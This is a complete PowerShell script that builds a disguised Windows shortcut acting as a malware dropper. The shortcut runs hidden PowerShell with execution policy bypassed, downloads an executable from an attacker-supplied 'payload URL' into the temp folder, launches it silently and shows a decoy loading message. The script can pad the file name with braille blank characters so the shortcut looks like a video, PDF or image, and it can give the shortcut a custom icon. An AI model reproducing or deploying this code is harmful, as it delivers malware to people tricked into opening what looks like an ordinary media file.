
do {
    $url = Read-Host "Enter the download URL (required)"
    if ([string]::IsNullOrWhiteSpace($url)) {
        Write-Host "URL cannot be empty. Try again." -ForegroundColor Red
    }
} until (-not [string]::IsNullOrWhiteSpace($url))

if (-not ($url -match "^https?://")) {
    Write-Host "Invalid URL - must start with http:// or https://" -ForegroundColor Red
    exit 1
}

$baseName = Read-Host "Enter shortcut base name (optional, press Enter for 'video')"
if ([string]::IsNullOrWhiteSpace($baseName)) {
    $baseName = "video"
}


$spoofChoice = Read-Host "Spoof extension with braille spaces? (y/n, default n)"
$doSpoof = $spoofChoice -match "^(y|yes)$"

$fakeExt = ""
if ($doSpoof) {
    do {
        $fakeExt = Read-Host "Enter fake extension (e.g. mp4, pdf, mp3, png, jpg, txt)"
        $fakeExt = $fakeExt.Trim().TrimStart('.').ToLower()
        if ([string]::IsNullOrWhiteSpace($fakeExt)) {
            Write-Host "Fake extension cannot be empty." -ForegroundColor Red
        }
    } until (-not [string]::IsNullOrWhiteSpace($fakeExt))
}

$CurrentDir = (Get-Location).Path

$CustomIcon = Join-Path $CurrentDir "image.ico"
if (Test-Path $CustomIcon) {
    $IconToUse = $CustomIcon
    $iconMsg = "Your custom ./image.ico"
} else {
    $IconToUse = "%SystemRoot%\System32\shell32.dll,0" 
    $iconMsg = "Generic blank file icon (./image.ico not found)"
}

$initialName = "$baseName.lnk"
$initialPath = Join-Path $CurrentDir $initialName

$randomName = -join ((65..90) + (97..122) | Get-Random -Count 10 | % {[char]$_}) + ".exe"
$tempPath = "C:\Users\$env:USERNAME\AppData\Local\Temp\$randomName"

$Shell = New-Object -ComObject WScript.Shell
$Shortcut = $Shell.CreateShortcut($initialPath)

$Shortcut.TargetPath = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
$Shortcut.Arguments = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"```$ProgressPreference = 'SilentlyContinue'; try { Invoke-WebRequest -Uri '$url' -OutFile '$tempPath' -ErrorAction Stop; if (Test-Path '$tempPath') { Start-Process '$tempPath' -WindowStyle Hidden; Start-Sleep -Seconds 2; [System.Windows.MessageBox]::Show('Starting... Please wait.','Loading','OK','Information') } } catch { }`""

$Shortcut.WorkingDirectory = "$env:SystemRoot\System32"
$Shortcut.Description = "Media file"
$Shortcut.WindowStyle = 7
$Shortcut.IconLocation = $IconToUse 
$Shortcut.Save()

if ($doSpoof) {
    $braille = [char]0x2800
    $padding = -join (1..100 | ForEach-Object { $braille })
    $spoofedBase = "$baseName.$fakeExt$padding" + "t"
    $finalName = $spoofedBase + ".lnk"
    $finalPath = Join-Path $CurrentDir $finalName

    try {
        Rename-Item -LiteralPath $initialPath -NewName $finalName -ErrorAction Stop
        Write-Host ""
        Write-Host "SUCCESS! Spoofed shortcut created" -ForegroundColor Green
        Write-Host "Visible name : $baseName.$fakeExt       t" -ForegroundColor Cyan
        Write-Host "Real file    : $finalName"
        Write-Host "Full path    : $finalPath"
        Write-Host "Icon         : $iconMsg"
        Write-Host ""
    } catch {
        Write-Host "Spoof failed: $($_.Exception.Message)" -ForegroundColor Red
        Write-Host "Plain .lnk created: $initialPath"
    }
} else {
    Write-Host ""
    Write-Host "Shortcut created (no spoof): $initialPath" -ForegroundColor Green
    Write-Host "Icon: $iconMsg"
}

Write-Host "Payload URL : $url"

Write-Host "Temp file   : $randomName (in %TEMP%)"
